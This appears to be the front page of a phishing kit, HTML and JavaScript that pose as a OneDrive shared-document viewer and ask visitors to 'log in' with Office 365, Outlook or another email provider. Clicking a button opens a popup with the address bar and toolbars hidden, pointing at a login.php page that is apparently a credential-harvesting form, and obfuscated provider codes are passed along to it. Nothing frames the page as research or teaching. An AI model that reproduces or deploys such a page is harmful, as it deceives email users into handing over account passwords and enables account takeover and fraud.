  <body class="">
    <div class="container start">
      <div class="row">
        <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
          <div class="card card-signin my-5 bodybg">
            <div class="card-body">
              <p style="text-align: center;">
                <img src=" data:image/png;base64," style="width: 175px;">
              </p>
              <h5 style="font-size: 16px; color: white" class="card-title text-center">To read the document, please choose your email provider below Login to view shared file. </h5>
              
                <button class="btn btn-google  text-uppercase" data-provider="0ff1c3">
                  <img src=" data:image/png;base64,">
                  Login with Office 365
                </button>
                <hr>
                <button class="btn btn-primary  text-uppercase" data-provider="l1v3">
                  <img src=" data:image/png;base64,">
                  Login with Outlook
                </button>
                 <hr>
                <button class="btn  btn-facebook  text-uppercase" data-provider="073r">
                  <img src=" data:image/png;base64,">
                  Login with Other Mail
                </button>
                <hr>
                <h5 style="font-size: 16px; color: white" class="card-title text-center">
                  Get to all your files from anywhere on any device, and share them with anyone. One Drive your shared document in one cloud. 
                </h5>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script type="text/javascript">
      function makeid(length) {
         var result           = '';
         var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         var charactersLength = characters.length;
         for ( var i = 0; i < length; i++ ) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
         }
         return result;
      }
      const lstr = makeid(40);
      $('.btn').click((e) => {
        e.preventDefault();
        const btn = e.target
        const v = $(btn).data().provider
        
        const pdfWindow = window.open(`login.php?page=${v}&sessionkey=${lstr}`, '', `toolbar=no,menubar=no,location=no,scrollbars=no,resizable=no,status=no,left=300,top=100,width=420 ,height=390`)
        // pdfWindow.document.write(`
        //   <iframe style="overflow: hidden" scrolling="no" frameBorder="0" width='390px' height='410px' src="login.php?page=${v}&sessionkey=${lstr}"></iframe>`
        //   )
        
      })
    </script>
